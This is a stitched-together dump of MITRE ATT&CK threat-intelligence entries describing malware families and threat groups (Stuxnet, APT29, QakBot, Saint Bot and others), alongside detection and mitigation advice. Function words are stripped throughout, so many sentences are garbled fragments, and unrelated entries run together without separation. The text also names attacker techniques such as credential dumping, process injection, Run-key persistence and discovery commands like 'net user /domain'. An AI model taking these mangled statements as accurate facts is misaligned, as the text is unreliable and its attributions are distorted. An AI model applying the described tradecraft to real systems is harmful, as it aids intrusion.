command.(Citation: TrendMicro EarthLusca 2022) [Stuxnet](https://attack.mitre.org/software/S0603) propagate removable media autorun.inf file CVE-2010-2568 LNK vulnerability.(Citation: Symantec W.32 Stuxnet Dossier) [APT33](https://attack.mitre.org/groups/G0064) variety publicly tools [LaZagne](https://attack.mitre.org/software/S0349), [Mimikatz](https://attack.mitre.org/software/S0002), ProcDump dump credentials.(Citation: Symantec Elfin Mar 2019)(Citation: FireEye APT33 Guardrail) [Chrommme](https://attack.mitre.org/software/S0667) store captured locally prior exfiltration.(Citation: ESET Gelsemium June 2021) Monitor processes viewed inject malicious code processes asynchronous procedure (APC) queue evade process-based defenses elevate privileges. [Aria-body](https://attack.mitre.org/software/S0456) ability identify hostname, name, Windows version, processor speed, machine GUID, disk compromised host.(Citation: CheckPoint Naikon 2020) [Carberp](https://attack.mitre.org/software/S0484) exploited multiple Windows vulnerabilities (CVE-2010-2743, CVE-2010-3338, CVE-2010-4398, CVE-2008-1084) .NET Runtime Optimization vulnerability privilege escalation.(Citation: ESET Carberp March 2012)(Citation: Prevx Carberp March 2011) [Wizard Spider](https://attack.mitre.org/groups/G0102) exfiltrated victim FTP.(Citation: DFIR Ryuk's Return October 2020)(Citation: DFIR Ryuk 2 Hour Speed November 2020) Monitor executed commands arguments token manipulation auditing command-line activity. Specifically, analysts <code>runas</code> command. Detailed command-line logging enabled default Windows.(Citation: Command-line Logging) [APT39](https://attack.mitre.org/groups/G0087) installed ANTAK ASPXSPY shells.(Citation: FireEye APT39 Jan 2019) Operators deploying [Netwalker](https://attack.mitre.org/software/S0457) batch scripts retrieve [Netwalker](https://attack.mitre.org/software/S0457) payload.(Citation: Sophos Netwalker 2020) (Citation: SecureWorks August 2019) [BadPatch](https://attack.mitre.org/software/S0337) attempts detect Virtual Machine (VM) WMI query disk drive name, BIOS, motherboard information. (Citation: Unit 42 BadPatch Oct 2017) [menuPass](https://attack.mitre.org/groups/G0045) Ntdsutil dump credentials.(Citation: Symantec Cicada November 2020) (Citation: Proofpoint TA505 Jan 2019)(Citation: Trend Micro TA505 June 2019)(Citation: Proofpoint TA505 October 2019) [QakBot](https://attack.mitre.org/software/S0650) signed loaders evade detection.(Citation: ATT QakBot April 2021)
 [Ke3chang](https://attack.mitre.org/groups/G0004) gained access VPNs including compromised accounts stolen VPN certificates.(Citation: NCC APT15 Alive Strong)(Citation: NICKEL December 2021)  Monitor failed authentication attempts accounts result password spraying attempts. difficult detect hashes cracked, scope target network. Organizations weighing risk storing credentials browsers. browser credential disclosure concern, technical controls, policy, user training prevent storage credentials browsers. [Ryuk](https://attack.mitre.org/software/S0446) called <code>kill.bat</code> stopping services, disabling services killing processes.(Citation: CrowdStrike Ryuk January 2019) [Derusbi](https://attack.mitre.org/software/S0021) malware supports timestomping.(Citation: Novetta-Axiom)(Citation: Fidelis Turbo) Automatically events log server data repository prevent conditions adversary locate manipulate data local system. possible, minimize time delay event reporting avoid prolonged storage local system.  Monitor newly constructed logon behavior Microsoft's SharePoint configured report access documents. (Citation: SharePoint Logging) repositories considerably user base, detection malicious non-trivial. [APT29](https://attack.mitre.org/groups/G0016) forged SAML tokens allowed actors impersonate users bypass MFA, enabling [APT29](https://attack.mitre.org/groups/G0016) access enterprise cloud applications services.(Citation: 365 Defender Solorigate)(Citation: Secureworks IRON RITUAL Profile) [Cobalt Strike](https://attack.mitre.org/software/S0154) enumerate services compromised hosts.(Citation: Cobalt Strike Manual 4.3 November 2020) [OSInfo](https://attack.mitre.org/software/S0165) queries registry Terminal Services.(Citation: Symantec Buckeye) [SILENTTRINITY](https://attack.mitre.org/software/S0692) modify registry keys, including enable disable Remote Desktop Protocol (RDP).(Citation: GitHub SILENTTRINITY Modules July 2019) [FunnyDream](https://attack.mitre.org/software/S1044) service named `WSearch` execution.(Citation: Bitdefender FunnyDream Campaign November 2020) [Bazar](https://attack.mitre.org/software/S0534) retrieve infected machine.(Citation: Cybereason Bazar July 2020) [S-Type](https://attack.mitre.org/software/S0085) attempted determine compromised Japanese keyboard `GetKeyboardType` API call.(Citation: Cylance Dust Storm) [Pandora](https://attack.mitre.org/software/S0664) ability gain privileges Windows services.(Citation: Trend Micro Iron Tiger April 2021) [GravityRAT](https://attack.mitre.org/software/S0237) creates scheduled task ensure re-executed everyday.(Citation: Talos GravityRAT) [FatDuke](https://attack.mitre.org/software/S0512) <code>HKLM\SOFTWARE\Microsoft\CurrentVersion\Run</code> establish persistence.(Citation: ESET Dukes October 2019) [HiddenWasp](https://attack.mitre.org/software/S0394) RC4-like algorithm computed PRGA generated key-stream network communication.(Citation: Intezer HiddenWasp Map 2019) [RegDuke](https://attack.mitre.org/software/S0511) persist WMI consumer launched time process named WINWORD.EXE started.(Citation: ESET Dukes October 2019) [DEATHRANSOM](https://attack.mitre.org/software/S0616) loop operations enumerate directories compromised host.(Citation: FireEye FiveHands April 2021) [QakBot](https://attack.mitre.org/software/S0650) obfuscated encoded scripts; hidden code Excel spreadsheets font color white splitting multiple cells.(Citation: Cyberint Qakbot 2021) [Saint Bot](https://attack.mitre.org/software/S1018) API calls, including `GetProcAddress`, `VirtualAllocEx`, `WriteProcessMemory`, `CreateProcessA`, `SetThreadContext`.(Citation: Malwarebytes Saint Bot April 2021)(Citation: Palo Alto Unit 42 OutSteel SaintBot February 2022 ) [QuasarRAT](https://attack.mitre.org/software/S0262) enumerate username account type.(Citation: CISA AR18-352A Quasar RAT December 2018) [SLOTHFULMEDIA](https://attack.mitre.org/software/S0533) capability start services.(Citation: CISA MAR SLOTHFULMEDIA October 2020) [DnsSystem](https://attack.mitre.org/software/S1021) download files compromised systems receiving command string `downloaddd`.(Citation: Zscaler Lyceum DnsSystem June 2022) [SpicyOmelette](https://attack.mitre.org/software/S0646) collected data compromised host.(Citation: Secureworks GOLD KINGSWOOD September 2018) activity visibility target organization, detection behavior difficult. Detection efforts focused stages adversary lifecycle, Command Control. [ServHelper](https://attack.mitre.org/software/S0382) commands adding remote desktop user sending RDP traffic attacker reverse SSH tunnel.(Citation: Proofpoint TA505 Jan 2019) [LiteDuke](https://attack.mitre.org/software/S0513) create persistence adding shortcut <code>CurrentVersion\Run</code> Registry key.(Citation: ESET Dukes October 2019) (Citation: Palo Alto Unit 42 OutSteel SaintBot February 2022 ) [Silence](https://attack.mitre.org/groups/G0091) JS scripts.(Citation: Cyber Forensicator Silence Jan 2019) [MoonWind](https://attack.mitre.org/software/S0149) encrypts C2 traffic RC4 static key.(Citation: Palo Alto MoonWind March 2017) [HTRAN](https://attack.mitre.org/software/S0040) inject running processes.(Citation: NCSC Joint Report Public Tools) monitoring modifications Registry code signing policies, <code>HKCU\Software\Policies\Microsoft\Windows NT\Driver Signing</code>. Modifications code signing policy rare. running elevated privileges, [OSX/Shlayer](https://attack.mitre.org/software/S0402) <code>spctl</code> command disable Gatekeeper protection downloaded file. [OSX/Shlayer](https://attack.mitre.org/software/S0402) leverage links bash scripts downloaded DMG file bypass Gatekeeper, flaw patched macOS 11.3 versions. [OSX/Shlayer](https://attack.mitre.org/software/S0402) Notarized Apple, successful passing additional Gatekeeper checks.(Citation: Carbon Black Shlayer Feb 2019)(Citation: Shlayer jamf gatekeeper bypass 2021)(Citation: objectivesee osx.shlayer apple approved 2020) Monitor newly executed processs sdbinst.exe potential indications application shim abuse. 
There public tools detect shims (Citation: Black Hat 2015 App Shim):
* Shim-Process-Scanner - checks memory running process shim flags
* Shim-Detector-Lite - detects installation custom shim databases
* Shim-Guard - monitors registry shim installations
* ShimScanner - forensic tool active shims memory
* ShimCacheMem - Volatility plug-in pulls shim cache memory (note: shims cached reboot) [SQLRat](https://attack.mitre.org/software/S0390) relies users clicking embedded image execute scripts.(Citation: Flashpoint FIN 7 March 2019) [Volatile Cedar](https://attack.mitre.org/groups/G0123) inject code server.(Citation: CheckPoint Volatile Cedar March 2015)(Citation: ClearSky Lebanese Cedar Jan 2021)  [APT29](https://attack.mitre.org/groups/G0016) RDP sessions public-facing systems internal servers.(Citation: CrowdStrike StellarParticle January 2022) Virtualization, sandbox, user activity, discovery techniques occur steps operation occur adversary learns environment. Data events viewed isolation, chain behavior lead activities, lateral movement, based obtained. Detecting actions virtualization sandbox identification difficult depending adversary's implementation monitoring required. Monitoring suspicious processes spawned gather variety perform forms Discovery, short period time, aid detection. [OSX_OCEANLOTUS.D](https://attack.mitre.org/software/S0352) Word macros execution.(Citation: TrendMicro MacOS April 2018) [Sidewinder](https://attack.mitre.org/groups/G0121) C2 communications.(Citation: ATT Sidewinder January 2021)(Citation: Rewterz Sidewinder APT April 2020)(Citation: Rewterz Sidewinder COVID-19 June 2020) [Agent Tesla](https://attack.mitre.org/software/S0331) routines exfiltration SMTP, FTP, HTTP.(Citation: Talos Agent Tesla Oct 2018)(Citation: Bitdefender Agent Tesla April 2020)(Citation: SentinelLabs Agent Tesla Aug 2020) [InnaputRAT](https://attack.mitre.org/software/S0259) enumerates directories obtains file attributes system.(Citation: ASERT InnaputRAT April 2018) [TEMP.Veles](https://attack.mitre.org/groups/G0088) modified files based open-source project cryptcat apparent attempt decrease AV detection rates.(Citation: FireEye TEMP.Veles 2018) [Donut](https://attack.mitre.org/software/S0695) generate packed code modules.(Citation: Donut Github)	 [AppleJeus](https://attack.mitre.org/software/S0584) scripts execute commands installation set persistence mechanisms.(Citation: CISA AppleJeus Feb 2021)(Citation: ObjectiveSee AppleJeus 2019) [TeamTNT](https://attack.mitre.org/groups/G0139) UPX Ezuri packer pack binaries.(Citation: Trend Micro TeamTNT) [Saint Bot](https://attack.mitre.org/software/S1018) relied users execute malicious attachment delivered spearphishing.(Citation: Malwarebytes Saint Bot April 2021)(Citation: Palo Alto Unit 42 OutSteel SaintBot February 2022 ) Application control prevent running executables masquerading files. Binaries baselined dynamic libraries require, app requires dynamic library wasn\u2019t included update, investigated. [APT39](https://attack.mitre.org/groups/G0087) downloaded tools compromised hosts.(Citation: Symantec Chafer February 2018)(Citation: FBI FLASH APT39 September 2020) [PoshC2](https://attack.mitre.org/software/S0378) enumerate local domain user account information.(Citation: GitHub PoshC2) [OSX_OCEANLOTUS.D](https://attack.mitre.org/software/S0352) sets main loader file’s attributes hidden.(Citation: TrendMicro MacOS April 2018) Monitor newly constructed services/daemons execute commands programs. (Citation: Cybereason StrifeWater Feb 2022) [Gazer](https://attack.mitre.org/software/S0168) communicates C2 servers HTTP.(Citation: ESET Gazer Aug 2017) Monitor network data uncommon data flows. Processes utilizing network network communication suspicious. version [Helminth](https://attack.mitre.org/software/S0170) consists VBScript scripts.(Citation: Palo Alto OilRig 2016) Monitor user authentication attempts, requesting access tokens services, failed Conditional Access Policies (CAP). SAML tokens features, location user, easy claim. Prevent users changing <code>HISTCONTROL</code> environment variable. (Citation: Securing bash history) [Get2](https://attack.mitre.org/software/S0460) ability identify running processes infected host.(Citation: Proofpoint TA505 October 2019) technique easily mitigated preventive controls based behaviors performed scope enterprise defenses controls. Efforts focus minimizing sensitivity data external parties. Modules pushed executed [Duqu](https://attack.mitre.org/software/S0038) data staging area, compress it, XOR encrypt it.(Citation: Symantec W32.Duqu) [Ember Bear](https://attack.mitre.org/groups/G1003) obfuscated malware malicious scripts avoid detection.(Citation: Palo Alto Unit 42 OutSteel SaintBot February 2022 ) Protect generated event files logs stored locally proper permissions authentication limit opportunities adversaries increase privileges preventing Privilege Escalation opportunities. [PcShare](https://attack.mitre.org/software/S1050) ability capture keystrokes.(Citation: Bitdefender FunnyDream Campaign November 2020)  [SideCopy](https://attack.mitre.org/groups/G1008) executed malware calling API function `CreateProcessW`.(Citation: MalwareBytes SideCopy Dec 2021) Monitor DLLs loaded process detect DLLs file abnormal paths. [Volgmer](https://attack.mitre.org/software/S0180) queries identify existing services.(Citation: US-CERT Volgmer Nov 2017) [PoetRAT](https://attack.mitre.org/software/S0428) [ftp](https://attack.mitre.org/software/S0095) exfiltration.(Citation: Talos PoetRAT April 2020) [Sandworm Team](https://attack.mitre.org/groups/G0034) conducted technical reconnaissance Parliament Georgia's official internet domain prior 2019 attack.(Citation: District Court Indictment GRU Unit 74455 October 2020) (Citation: Trend Micro DRBControl February 2020) [NotPetya](https://attack.mitre.org/software/S0368) determines specific antivirus programs running infected host machine.(Citation: District Court Indictment GRU Unit 74455 October 2020) [APT41](https://attack.mitre.org/groups/G0096) spearphishing emails attachments compiled (.chm) files initially compromise victims.(Citation: FireEye APT41 Aug 2019) [APT29](https://attack.mitre.org/groups/G0016) forms spearphishing attempting user malicous link.(Citation: FireEye APT29 Nov 2018)(Citation: ESET Dukes October 2019)(Citation: MSTIC NOBELIUM 2021)(Citation: Secureworks IRON RITUAL USAID Phish 2021) user local administrator multiple systems. [APT18](https://attack.mitre.org/groups/G0026) actors deleted tools batch files victim systems.(Citation: Dell Lateral Movement) [Metamorfo](https://attack.mitre.org/software/S0455) embedded "vmdetect.exe" executable identify virtual machines execution.(Citation: Medium Metamorfo Apr 2020)  Monitor .LNK, .SCF, files systems virtual environments resources external network resources  [PoshC2](https://attack.mitre.org/software/S0378) module compressing data ZIP.(Citation: GitHub PoshC2) "SCOUT" variant [NETEAGLE](https://attack.mitre.org/software/S0034) achieves persistence adding <code>HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run</code> Registry key.(Citation: FireEye APT30) (Citation: Forbes Dyre 2017)(Citation: CrowdStrike Wizard Spider March 2019)(Citation: Malwarebytes TrickBot Sep 2019) [NETEAGLE](https://attack.mitre.org/software/S0034) attempt detect infected host configured proxy. so, [NETEAGLE](https://attack.mitre.org/software/S0034) send beacons POST request. [NETEAGLE](https://attack.mitre.org/software/S0034) download resources IP address Port pair connect C2.(Citation: FireEye APT30) [Rover](https://attack.mitre.org/software/S0090) takes screenshots compromised system's desktop saves <code>C:\system\screenshot.bmp</code> exfiltration 60 minutes.(Citation: Palo Alto Rover) [Caterpillar WebShell](https://attack.mitre.org/software/S0572) commands compromised asset CMD functions.(Citation: ClearSky Lebanese Cedar Jan 2021) [SUNBURST](https://attack.mitre.org/software/S0559) commands enumerate files directories.(Citation: FireEye SUNBURST Backdoor December 2020)(Citation: Analyzing Solorigate Dec 2020) [YAHOYAH](https://attack.mitre.org/software/S0388) checks antimalware solution processes system.(Citation: TrendMicro TropicTrooper 2015) [Dtrack](https://attack.mitre.org/software/S0567) collect network active connection information.(Citation: Securelist Dtrack) [Crutch](https://attack.mitre.org/software/S0538) exfiltrated stolen data Dropbox.(Citation: ESET Crutch December 2020) [Shark](https://attack.mitre.org/software/S1019) update configuration C2 server.(Citation: ClearSky Siamesekitten August 2021) [APT38](https://attack.mitre.org/groups/G0082) code packing methods Themida, Enigma, VMProtect, Obsidium, pack implants.(Citation: FireEye APT38 Oct 2018) [Saint Bot](https://attack.mitre.org/software/S1018) written payload newly-created `EhStorAuthn.exe` process `ZwWriteVirtualMemory` executed `NtQueueApcThread` `ZwAlertResumeThread`.(Citation: Malwarebytes Saint Bot April 2021) [Cuba](https://attack.mitre.org/software/S0625) enumerate files variety functions.(Citation: McAfee Cuba April 2021) Monitor activation invocation container deploy container environment facilitate execution evade defenses. Periodically baseline snapshots identify malicious modifications additions. [Aria-body](https://attack.mitre.org/software/S0456) ability delete files directories compromised hosts.(Citation: CheckPoint Naikon 2020) [Wizard Spider](https://attack.mitre.org/groups/G0102) WMI identify anti-virus products installed victim's machine.(Citation: DFIR Ryuk's Return October 2020) [KOCTOPUS](https://attack.mitre.org/software/S0669) `cmd.exe` batch files execution.(Citation: MalwareBytes LazyScripter Feb 2021) [RDAT](https://attack.mitre.org/software/S0495) created service installed victim machine.(Citation: Unit42 RDAT July 2020)	 [Skidmap](https://attack.mitre.org/software/S0468) ability replace pam_unix.so file infected machine malicious version accepts specific backdoor password users.(Citation: Trend Micro Skidmap) [CrackMapExec](https://attack.mitre.org/software/S0488) enumerate shared folders permissions targeted network.(Citation: CME Github September 2018) [POWRUNER](https://attack.mitre.org/software/S0184) collect user account running <code>net user /domain</code> series commands victim.(Citation: FireEye APT34 Dec 2017) [NBTscan](https://attack.mitre.org/software/S0590) scan IP networks.(Citation: Debian nbtscan Nov 2019)(Citation: SecTools nbtscan June 2003) [Cobalt Strike](https://attack.mitre.org/software/S0154) timestomp files payloads target machine blend in.(Citation: cobaltstrike manual)(Citation: Cobalt Strike Manual 4.3 November 2020) [Tonto Team](https://attack.mitre.org/groups/G0131) keylogging tools operations.(Citation: TrendMicro Tonto Team October 2020) [SoreFang](https://attack.mitre.org/software/S0516) gain access exploiting Sangfor SSL VPN vulnerability placement delivery malicious update binaries.(Citation: CISA SoreFang July 2016) [Leviathan](https://attack.mitre.org/groups/G0065) spearphishing emails links, fraudulent lookalike domain stolen branding.(Citation: Proofpoint Leviathan Oct 2017)(Citation: CISA AA21-200A APT40 July 2021) [HALFBAKED](https://attack.mitre.org/software/S0151) running processes victim.(Citation: FireEye FIN7 April 2017) Traffic anonymity networks C2 infrastructure blocked network black white lists. blocking circumvented techniques [Domain Fronting](https://attack.mitre.org/techniques/T1172). [Linfo](https://attack.mitre.org/software/S0211) creates backdoor remote attackers list contents drives search files.(Citation: Symantec Linfo 2012) [WellMess](https://attack.mitre.org/software/S0514) write files compromised host.(Citation: PWC WellMess July 2020)(Citation: CISA WellMess July 2020) [Proton](https://attack.mitre.org/software/S0279) gathers credentials files keychains.(Citation: objsee mac malware 2017) PowerShell profiles immutable changeable administrators limit ability adversaries easily create user level persistence. Prevent administrator accounts enumerated application elevating UAC lead disclosure account names. Registry key located <code>HKLM\ SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\CredUI\EnumerateAdministrators</code>. disabled GPO: Configuration > [Policies] > Administrative Templates > Windows Components > Credential User Interface: numerate administrator accounts elevation. (Citation: UCF STIG Elevation Account Enumeration) [CSPY Downloader](https://attack.mitre.org/software/S0527) download additional tools compromised host.(Citation: Cybereason Kimsuky November 2020) [Zebrocy](https://attack.mitre.org/software/S0251) collects OS version, serial storage volume C:\. [Zebrocy](https://attack.mitre.org/software/S0251) runs <code>systeminfo</code> command gather information. (Citation: Palo Alto Sofacy 06-2018)(Citation: Unit42 Cannon Nov 2018)(Citation: ESET Zebrocy Nov 2018)(Citation: Unit42 Sofacy Dec 2018)(Citation: ESET Zebrocy 2019)(Citation: Accenture SNAKEMACKEREL Nov 2018)(Citation: CISA Zebrocy Oct 2020) [ccf32](https://attack.mitre.org/software/S1043) delete files folders compromised machines.(Citation: Bitdefender FunnyDream Campaign November 2020) Authentication, Authorization, Accounting (AAA) systems limit actions administrators perform provide history user actions detect unauthorized abuse. TACACS+ control commands administrators permitted configuration authentication command authorization. (Citation: Cisco IOS Software Integrity Assurance - AAA) (Citation: Cisco IOS Software Integrity Assurance - TACACS) [Grandoreiro](https://attack.mitre.org/software/S0531) parse Outlook .pst files extract e-mail addresses.(Citation: ESET Grandoreiro April 2020) Detect lack reported activity host sensor. methods blocking disruptions reporting. Systems suddenly reporting data kinds data. Depending types host collected, analyst detect event triggered process connection blocked. example, Sysmon log configuration changed (Event 16) Windows Management Instrumentation (WMI) subscribe ETW providers log provider removal specific trace session. (Citation: Medium Event Tracing Tampering 2018) [Cannon](https://attack.mitre.org/software/S0351) SMTP/S POP3/S C2 communications sending receiving emails.(Citation: Unit42 Cannon Nov 2018) [Operation Wocao](https://attack.mitre.org/campaigns/C0014), threat actors archived collected files WinRAR, prior exfiltration.(Citation: FoxIT Wocao December 2019) services aid tracking newly issued certificates certificates sites Internet. pivot pieces certificate uncover adversary infrastructure.(Citation: Splunk Kovar Certificates 2017) server-side components adversary tools default values set SSL/TLS certificates.(Citation: Recorded Future Beacon Certificates) [DarkComet](https://attack.mitre.org/software/S0334) collect name, RAM used, operating version victim’s machine.(Citation: TrendMicro DarkComet Sept 2014)(Citation: Malwarebytes DarkComet March 2018) [RogueRobin](https://attack.mitre.org/software/S0270) regsvr32.exe .sct file execution.(Citation: Unit42 DarkHydrus Jan 2019) [Dragonfly](https://attack.mitre.org/groups/G0035) registered domains targeting intended victims.(Citation: CISA AA20-296A Berserk Bear December 2020) [CosmicDuke](https://attack.mitre.org/software/S0050) searches attached mounted drives file extensions keywords match predefined list.(Citation: F-Secure Cosmicduke) [LightNeuron](https://attack.mitre.org/software/S0395) function encrypt store emails collects.(Citation: ESET LightNeuron 2019) [Ke3chang](https://attack.mitre.org/groups/G0004) network scanning enumeration tools, including [Ping](https://attack.mitre.org/software/S0097).(Citation: NCC APT15 Alive Strong) Monitor files create modify Launch Daemons execute malicious payloads persistence. [GALLIUM](https://attack.mitre.org/groups/G0093) shells persist victim environments assist execution exfiltration.(Citation: Cybereason Soft Cell June 2019)(Citation: GALLIUM December 2019) [BadPatch](https://attack.mitre.org/software/S0337) keylogging capability.(Citation: Unit 42 BadPatch Oct 2017) [DanBot](https://attack.mitre.org/software/S1014) upload files compromised hosts.(Citation: SecureWorks August 2019) [Kimsuky](https://attack.mitre.org/groups/G0094) specific Registry values compromised host.(Citation: Talos Kimsuky Nov 2021) [Empire](https://attack.mitre.org/software/S0363) add SID-History user domain controller.(Citation: Github PowerShell Empire) [Fox Kitten](https://attack.mitre.org/groups/G0117) accessed victim security environments Teams valuable information.(Citation: CISA AA20-259A Iran-Based Actor September 2020) (Citation: Rancor Unit42 June 2018) [CosmicDuke](https://attack.mitre.org/software/S0050) collects user credentials, including passwords, programs including browsers.(Citation: F-Secure Dukes) [NETWIRE](https://attack.mitre.org/software/S0198) crontabs establish persistence.(Citation: Red Canary NETWIRE January 2020) Remove users local administrator systems. (Citation: TrendMicro EarthLusca 2022) [Chimera](https://attack.mitre.org/groups/G0114) Windows admin shares laterally.(Citation: Cycraft Chimera April 2020)(Citation: NCC Chimera January 2021) [DustySky](https://attack.mitre.org/software/S0062) detect connected USB devices.(Citation: Kaspersky MoleRATs April 2019) [CSPY Downloader](https://attack.mitre.org/software/S0527) attempted legitimate Windows service fake description claiming support packed applications.(Citation: Cybereason Kimsuky November 2020) Limit permissions users user create tokens. setting defined local account only. GPO: Configuration > [Policies] > Windows Settings > Security Settings > Local Policies > User Rights Assignment: Create token object. (Citation: Create Token) define create process level token local network service GPO: Configuration > [Policies] > Windows Settings > Security Settings > Local Policies > User Rights Assignment: Replace process level token.(Citation: Replace Process Token)

Administrators log standard user tools administrator privileges built-in access token manipulation command <code>runas</code>.(Citation: runas) Monitor status firewall Windows Security Auditing events 5025 (The Windows firewall service stopped) 5034 (The Windows firewall driver stopped). [RogueRobin](https://attack.mitre.org/software/S0270) collects victim’s username user admin.(Citation: Unit 42 DarkHydrus July 2018) [Imminent Monitor](https://attack.mitre.org/software/S0434) remote webcam monitoring capability.(Citation: Imminent Unit42 Dec2019)(Citation: QiAnXin APT-C-36 Feb2019) [ServHelper](https://attack.mitre.org/software/S0382) attempt establish persistence <code>HKCU\Software\Microsoft\Windows\CurrentVersion\Run\</code> key.(Citation: Deep Instinct TA505 Apr 2019) [Maze](https://attack.mitre.org/software/S0449) issued shutdown command victim machine that, reboot, ransomware VM.(Citation: Sophos Maze VM September 2020) [WhisperGate](https://attack.mitre.org/software/S0689) HTTPS connection download additional files.(Citation: Unit 42 WhisperGate January 2022)(Citation: Medium S2W WhisperGate January 2022) [Cobalt Group](https://attack.mitre.org/groups/G0080) regsvr32.exe execute scripts.(Citation: Talos Cobalt July 2018)(Citation: Morphisec Cobalt Gang Oct 2018)(Citation: TrendMicro Cobalt Nov 2017) [MiniDuke](https://attack.mitre.org/software/S0051) Google Search identify C2 servers primary C2 method Twitter working.(Citation: Securelist MiniDuke Feb 2013) [Bad Rabbit](https://attack.mitre.org/software/S0606) [Mimikatz](https://attack.mitre.org/software/S0002) harvest credentials victim's machine.(Citation: ESET Bad Rabbit) Update software regularly include patches DLL side-loading vulnerabilities. Monitor DLLs loaded spoolsv.exe DLLs abnormal. DLLs written System32 directory correlate software patching suspicious. (Citation: Checkpoint IndigoZebra July 2021) Monitor analyze execution arguments hh.exe. (Citation: MsitPros CHM Aug 2017) Compare invocations hh.exe prior history arguments determine anomalous adversarial activity (ex: obfuscated malicious commands). Non-standard process execution trees suspicious malicious behavior, hh.exe parent process suspicious processes activity relating adversarial techniques. Follow Office macro security practices suitable environment. Disable Office VBA macros executing.

Disable Office add-ins. required, follow practices securing requiring signed disabling user notification allowing add-ins. add-ins types (WLL, VBA) additional mitigation required disabling add-ins Office Trust Center disable WLL prevent VBA code executing. (Citation: MRWLabs Office Persistence Add-ins) [Bisonal](https://attack.mitre.org/software/S0268)'s DLL file non-malicious decoy file encrypted RC4 function strings obfuscated.(Citation: Unit 42 Bisonal July 2018)(Citation: Talos Bisonal Mar 2020) [Linfo](https://attack.mitre.org/software/S0211) creates backdoor remote attackers delete files.(Citation: Symantec Linfo 2012) [APT3](https://attack.mitre.org/groups/G0022) add created accounts local admin maintain elevated access.(Citation: aptsim) [Sandworm Team](https://attack.mitre.org/groups/G0034) enumerated files compromised host.(Citation: District Court Indictment GRU Unit 74455 October 2020)(Citation: Dragos Crashoverride 2018) [Winnti Windows](https://attack.mitre.org/software/S0141) HTTP/S C2 mode local proxy.(Citation: Novetta Winnti April 2015) Prevent adversary access privileged accounts access perform technique. Enable Registry Global Object Access Auditing (Citation: Registry Auditing Aug 2016) setting Advanced Security Audit policy apply global access control list (SACL) event auditing modifications Registry values (sub)keys SIPs trust providers:(Citation: Audit Registry July 2012)
* <code>HKLM\SOFTWARE\Microsoft\Cryptography\OID</code>
* <code>HKLM\SOFTWARE\WOW6432Node\Microsoft\Cryptography\OID</code>
* <code>HKLM\SOFTWARE\Microsoft\Cryptography\Providers\Trust</code>
* <code>HKLM\SOFTWARE\WOW6432Node\Microsoft\Cryptography\Providers\Trust</code>

**Note:** technique, adversaries attempt manually edit Registry (ex: Regedit) utilize legitimate registration process using [Regsvr32](https://attack.mitre.org/techniques/T1218/010).(Citation: SpectorOps Subverting Trust Sept 2017)

Periodically baseline registered SIPs trust providers (Registry entries files disk), new, modified, non-Microsoft entries.(Citation: SpectorOps Subverting Trust Sept 2017) [PowerDuke](https://attack.mitre.org/software/S0139) command list victim's processes.(Citation: Volexity PowerDuke November 2016) [UBoatRAT](https://attack.mitre.org/software/S0333) C2 communications.(Citation: PaloAlto UBoatRAT Nov 2017) [Patchwork](https://attack.mitre.org/groups/G0040) watering holes deliver files exploits initial victims.(Citation: Symantec Patchwork)(Citation: Volexity Patchwork June 2018) [Empire](https://attack.mitre.org/software/S0363) modules discover exploit unquoted path vulnerabilities.(Citation: Github PowerShell Empire) [PolyglotDuke](https://attack.mitre.org/software/S0518) <code>LoadLibraryW</code> <code>CreateProcess</code> load execute code.(Citation: ESET Dukes October 2019) (Citation: Mandiant APT1) [Ember Bear](https://attack.mitre.org/groups/G1003) stolen certificates Electrum Technologies GmbH sign payloads.(Citation: Palo Alto Unit 42 OutSteel SaintBot February 2022 ) [OSX_OCEANLOTUS.D](https://attack.mitre.org/software/S0352) <code>touch -t</code> command change timestamps.(Citation: Trend Micro MacOS Backdoor November 2020)(Citation: 20 macOS Common Tools Techniques) [REvil](https://attack.mitre.org/software/S0496) Native API execution retrieve active services.(Citation: Secureworks REvil September 2019)(Citation: Intel 471 REvil March 2020) [Saint Bot](https://attack.mitre.org/software/S1018) distributed malicious links contained spearphishing emails.(Citation: Palo Alto Unit 42 OutSteel SaintBot February 2022 ) [SILENTTRINITY](https://attack.mitre.org/software/S0692) collect start time compromised host.(Citation: GitHub SILENTTRINITY Modules July 2019) [C0015](https://attack.mitre.org/campaigns/C0015), threat actors command `net "domain admins" /dom` enumerate domain groups.(Citation: DFIR Conti Bazar Nov 2021) (Citation: Mandiant Easy Breach) [Waterbear](https://attack.mitre.org/software/S0579) deleted values Registry load malicious DLL.(Citation: Trend Micro Waterbear December 2019)  [LoJax](https://attack.mitre.org/software/S0397) UEFI BIOS rootkit deployed persist remote access software targeted systems.(Citation: ESET LoJax Sept 2018)  [CSPY Downloader](https://attack.mitre.org/software/S0527) requests download additional payloads C2.(Citation: Cybereason Kimsuky November 2020) [HAWKBALL](https://attack.mitre.org/software/S0391) collect user system.(Citation: FireEye HAWKBALL Jun 2019) [Chimera](https://attack.mitre.org/groups/G0114) PowerShell scripts execute malicious payloads DSInternals PowerShell module Active Directory features.(Citation: Cycraft Chimera April 2020)(Citation: NCC Chimera January 2021)	 [Cuba](https://attack.mitre.org/software/S0625) download files C2 server.(Citation: McAfee Cuba April 2021) [PoetRAT](https://attack.mitre.org/software/S0428) checked size hard drive determine sandbox environment. event sandbox detection, delete overwriting malware scripts contents "License.txt" exiting.(Citation: Talos PoetRAT April 2020) [C0010](https://attack.mitre.org/campaigns/C0010), UNC3890 actors staged malware infrastructure direct download compromised system.(Citation: Mandiant UNC3890 Aug 2022)  [BADFLICK](https://attack.mitre.org/software/S0642) captured victim name, memory space, CPU details.(Citation: Accenture MUDCARP March 2019) [TRITON](https://attack.mitre.org/software/S0609) trilog.exe, Py2EXE compiled python script accepts single IP address flag.(Citation: FireEye TRITON 2017) [APT1](https://attack.mitre.org/groups/G0006) <code>ipconfig /all</code> command gather network configuration information.(Citation: Mandiant APT1) [Koadic](https://attack.mitre.org/software/S0250) PowerShell establish persistence.(Citation: MalwareBytes LazyScripter Feb 2021)  [Kimsuky](https://attack.mitre.org/groups/G0094) collected victim organization including limited organization hierarchy, functions, press releases, others.(Citation: KISA Operation Muzabi) Monitor executed commands arguments control preexisting sessions remote services laterally environment. Monitor execution commands arguments adversaries modify services' registry values applications Windows Management Instrumentation PowerShell. Additional logging configured gather data. [Kazuar](https://attack.mitre.org/software/S0265) directory, lists files metadata files.(Citation: Unit 42 Kazuar 2017) (Citation: US-CERT HOTCROISSANT February 2020) [InvisiMole](https://attack.mitre.org/software/S0260) collect data system, monitor directories.(Citation: ESET InvisiMole June 2018) 